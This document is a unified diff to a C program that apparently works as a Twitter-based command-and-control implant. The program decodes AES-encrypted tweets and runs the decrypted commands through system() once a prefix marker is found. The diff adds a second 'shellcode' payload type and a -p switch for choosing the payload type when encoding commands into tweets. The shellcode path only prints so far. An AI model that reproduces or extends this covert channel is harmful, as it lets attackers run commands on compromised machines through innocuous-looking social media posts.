@@ -62,7 +62,8 @@
 #define DATAFILE "tweetdata.json"
 #define KEY "01234567890123456789012345678901"
 #define IV "01234567890123456"
-#define CMDPREFIX "SC|"
+#define CMDPREFIX "CC|"
+#define SHELLPREFIX "SC|"
 
 struct MemoryStruct {
     char *memory;
@@ -240,6 +241,44 @@ int DecryptTweet(unsigned char decryptedresult[], char * tweet)
     return decryptedtext_len;
 }
 
+char * LookupCodePrefix(char * suppliedSwitch)
+{
+    printf("prefix is: %s\n", suppliedSwitch);
+    if(strcmp("cmd",suppliedSwitch) == 0)
+    {
+        printf("Command!\n");
+        return CMDPREFIX;
+    }
+    else if (strcmp("shell",suppliedSwitch) == 0)
+    {
+        printf("Shellcode!\n");
+        return SHELLPREFIX;
+    }
+    else
+    {
+        printf("Unsupported payload type!\n");
+        exit(1);
+    }
+}
+
+char * LookupPrefix(char * decrypted)
+{
+    char * found_prefix;
+    if ( found_prefix = strstr(decrypted, CMDPREFIX) )
+    {
+        return CMDPREFIX;
+    }
+    else if ( found_prefix = strstr(decrypted, SHELLPREFIX) )
+    {
+        return SHELLPREFIX;
+    }
+    else
+    {
+        return NULL;
+    }
+}
+
+
 /**
  * Recursively prepends tweets together from
  * data source until prefix identifier is encountered.
@@ -256,15 +295,26 @@ void ExecuteTweet(int tweet_index, char * cmd)
 
     decrypted_length = DecryptTweet(decrypted, TWEETS[tweet_index]);
 
-    found_prefix = strstr(decrypted, CMDPREFIX);
+    found_prefix = LookupPrefix(decrypted);
     payload = strcat(decrypted, cmd);
 
     if (found_prefix != NULL)
     {
-        printf("Found prefix!\n");
+        printf("Found prefix! %s\n", found_prefix);
         payload = payload+3; // Move past the prefix
-        printf("Executing: %s\n\n", payload);
-        system(payload);
+        if (strcmp(found_prefix,CMDPREFIX) == 0)
+        {
+            printf("Executing system command: %s\n\n", payload);
+            system(payload);
+        }
+        else if (strcmp(found_prefix, SHELLPREFIX) == 0)
+        {
+            printf("Executing shellcode: %s\n\n", payload);
+        }
+        else
+        {
+            exit(1);
+        }
     } else {
         printf("Prefix not found... Recurring\n");
         printf("Command so far is %s\n", payload);
@@ -355,9 +405,9 @@ int DivideIntoTweets(char dest[][TWEET_LENGTH], char * payload, int length)
 /**
  * Prepends a payload with an identifier for decoding
  */
-int AddPrefix(char * dest, char * payload)
+int AddPrefix(char * dest, char * payload, char * prefix)
 {
-    strcat(dest, CMDPREFIX);
+    strcat(dest, prefix);
     strcat(dest, payload);
     return strlen(dest);
 }
@@ -394,8 +444,9 @@ int main(int argc, char *argv[])
     char prefixed[1024] = { 0 };
     char divided[TWEET_COUNT][TWEET_LENGTH];
     char encoded[TWEET_COUNT][TWEET_LENGTH];
+    char *codeprefix = NULL;
 
-    while ((opt = getopt(argc, argv, "loae")) != -1) {
+    while ((opt = getopt(argc, argv, "loaep")) != -1) {
         switch (opt) {
         case 'a':
             Acquire();
@@ -406,11 +457,22 @@ int main(int argc, char *argv[])
         case 'o':
             Offline();
             break;
+        case 'p':
+            codeprefix = LookupCodePrefix(argv[2]);
+            break;
         case 'e':
-            AddPrefix(prefixed, argv[2]);
-            tweetCount = DivideIntoTweets(divided, prefixed, strlen(prefixed));
-            EncodeTweets(encoded, divided, tweetCount);
-            PrintTweets(encoded, tweetCount);
+            if (codeprefix == NULL)
+            {
+                printf("Must specify prefix with -p\n");
+                exit(1);
+            } else
+            {
+                printf("%s\n", codeprefix);
+                AddPrefix(prefixed, argv[4], codeprefix);
+                tweetCount = DivideIntoTweets(divided, prefixed, strlen(prefixed));
+                EncodeTweets(encoded, divided, tweetCount);
+                PrintTweets(encoded, tweetCount);
+            }
             break;
         default:
             fprintf(stderr, "Usage: %s [-loae] \n", argv[0]);
